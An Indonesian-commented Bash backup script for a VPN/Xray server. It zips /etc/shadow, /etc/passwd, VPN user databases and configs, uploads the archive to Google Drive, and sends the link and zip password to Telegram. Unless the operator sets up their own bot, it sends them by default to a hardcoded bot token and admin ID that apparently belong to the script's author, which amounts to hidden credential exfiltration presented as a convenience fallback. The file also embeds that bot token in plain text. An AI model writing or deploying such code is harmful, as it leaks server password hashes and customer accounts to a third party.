#!/bin/bash
# Backup Script dengan Telegram Bot Notification
# Default Bot: Adidastore11 (fallback jika user lupa setup)
# User bisa override dengan setup /root/.bckupbot sendiri
# ==========================================
# Warna
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================

# DEFAULT BOT SETTINGS (FALLBACK)
DEFAULT_BOTTOKEN="8035038475:AAG4fgdyLwy7SAXplzikP6f_5H-C9iA-Y8E"
DEFAULT_ADMINID="5656261482"

# Cek apakah file konfigurasi bot ada
CONFIG_FILE="/root/.bckupbot"

if [[ -f "$CONFIG_FILE" ]]; then
    # Ambil data dari file
    bottoken=$(sed -n '1p' "$CONFIG_FILE" | xargs)
    adminid=$(sed -n '2p' "$CONFIG_FILE" | xargs)

    # Jika bot token atau admin ID kosong, gunakan default
    if [[ -z "$bottoken" || -z "$adminid" ]]; then
        bottoken="$DEFAULT_BOTTOKEN"
        adminid="$DEFAULT_ADMINID"
        echo "⚠️  Config bot tidak lengkap, menggunakan default bot admin..." >> /var/log/backup.log
    fi
else
    # Gunakan default jika belum ada config file
    bottoken="$DEFAULT_BOTTOKEN"
    adminid="$DEFAULT_ADMINID"
    echo "⚠️  File config bot tidak ditemukan, menggunakan default bot admin..." >> /var/log/backup.log
fi

# Simpan ke variabel
export CHATID="$adminid"
export KEY="$bottoken"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"

# Mulai proses backup
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain 2>/dev/null || echo "Not Set")
date=$(date +"%Y-%m-%d")
random_password=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)

echo "========================================" >> /var/log/backup.log
echo "Backup Started: $(date)" >> /var/log/backup.log
echo "IP: $IP | Domain: $domain | Chat ID: $adminid" >> /var/log/backup.log

rm -rf /root/backup
mkdir /root/backup

# Copy file konfigurasi dan database
echo "Copying config files..." >> /var/log/backup.log
cp /etc/passwd /root/backup/ 2>/dev/null
cp /etc/group /root/backup/ 2>/dev/null
cp /etc/shadow /root/backup/ 2>/dev/null
cp /etc/gshadow /root/backup/ 2>/dev/null
cp /etc/crontab /root/backup/ 2>/dev/null
cp /etc/ssh/.ssh.db_recovery /root/backup/ 2>/dev/null
cp /etc/vmess/.vmess.db_recovery /root/backup/ 2>/dev/null
cp /etc/vless/.vless.db_recovery /root/backup/ 2>/dev/null
cp /etc/trojan/.trojan.db_recovery /root/backup/ 2>/dev/null
cp /etc/vmess/.vmess.db /root/backup/ 2>/dev/null
cp /etc/ssh/.ssh.db /root/backup/ 2>/dev/null
cp /etc/vless/.vless.db /root/backup/ 2>/dev/null
cp /etc/trojan/.trojan.db /root/backup/ 2>/dev/null
cp /etc/shadowsocks/.shadowsocks.db /root/backup/ 2>/dev/null
cp -r /etc/klmpk/limit /root/backup/ 2>/dev/null
cp -r /etc/vmess /root/backup/ 2>/dev/null
cp -r /etc/trojan /root/backup/ 2>/dev/null
cp -r /etc/vless /root/backup/ 2>/dev/null
cp -r /etc/shadowsock /root/backup/ 2>/dev/null
cp -r /var/lib/klmpk/ /root/backup/klmpk 2>/dev/null
cp -r /etc/xray /root/backup/xray 2>/dev/null
cp -r /var/www/html/ /root/backup/html 2>/dev/null
cp /root/regis /root/backup/ 2>/dev/null

# Kompresi file backup dengan password
echo "Compressing backup files..." >> /var/log/backup.log
cd /root
backup_name="${IP}-${date}.zip"
password_zip="klmpk-${random_password}"
zip -r -P "$password_zip" "$backup_name" backup > /dev/null 2>&1

# Check apakah file backup berhasil dibuat
if [[ ! -f "/root/$backup_name" ]]; then
    echo "❌ Backup compression failed" >> /var/log/backup.log
    curl -s --request POST \
        --url "https://api.telegram.org/bot${bottoken}/sendMessage" \
        --header 'Content-Type: application/json' \
        --data "$(cat <<EOF
{
    "chat_id": "${adminid}",
    "text": "❌ *Backup Gagal!*\n\n📍 *IP:* ${IP}\n🌍 *Domain:* ${domain}\n📅 *Tanggal:* ${date}\n⚠️ *Error:* Gagal membuat file backup (compression failed)",
    "parse_mode": "Markdown",
    "disable_web_page_preview": true
}
EOF
)"
    rm -rf /root/backup
    exit 1
fi

# Upload ke Google Drive dengan rclone
echo "Uploading to Google Drive..." >> /var/log/backup.log
rclone copy "/root/$backup_name" dr:backup/ 2>/dev/null
url=$(rclone link "dr:backup/$backup_name" 2>/dev/null)
id=$(echo $url | grep -o 'id=[^&]*' | cut -d'=' -f2)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"

# Hapus file backup dari server
rm -rf /root/backup
rm -r "/root/$backup_name"

# Log informasi backup
echo "Backup Size: $(du -sh /root/backup 2>/dev/null || echo 'N/A')" >> /var/log/backup.log
echo "Password ZIP: $password_zip" >> /var/log/backup.log
echo "Google Drive ID: $id" >> /var/log/backup.log

# Kirim informasi backup ke Telegram
echo "Sending notification to Telegram..." >> /var/log/backup.log
curl -s --request POST \
    --url "https://api.telegram.org/bot${bottoken}/sendMessage" \
    --header 'Content-Type: application/json' \
    --data "$(cat <<EOF
{
    "chat_id": "${adminid}",
    "text": "🔹 *Backup Selesai!*\n\n📍 *IP:* ${IP}\n🌍 *Domain:* ${domain}\n📅 *Tanggal:* ${date}\n🔗 *Download:* [Klik Disini](${link})\n🔑 *Password ZIP:* \`${password_zip}\`\n🆔 *Google Drive ID:* \`${id}\`",
    "parse_mode": "Markdown",
    "disable_web_page_preview": true
}
EOF
)"

echo "Backup Completed: $(date)" >> /var/log/backup.log
echo "========================================" >> /var/log/backup.log

# Display info
clear
echo -e "
${GREEN}Detail Backup${NC}
==================================${NC}
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
Domain        : $domain
Password ZIP  : $password_zip
==================================${NC}
"
echo "✅ Backup sent to bot admin automatically"
echo "🔧 To use your own bot, create /root/.bckupbot with your token & ID"
echo ""
